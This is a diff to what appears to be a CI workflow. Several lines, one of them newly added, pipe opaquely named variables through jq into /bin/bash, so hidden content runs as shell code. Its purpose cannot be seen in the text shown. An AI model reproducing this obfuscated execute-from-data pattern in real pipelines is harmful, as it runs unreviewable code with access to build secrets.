@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$mqdev87398" | jq -r .wgt9 | /bin/bash
           printf '%s' "$jcj7" | jq -r .mrtt289 | /bin/bash
           printf '%s' "$bgefd19034" | jq -r .mps8570 | /bin/bash
+          echo $mune83 | jq -r .rivm0 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
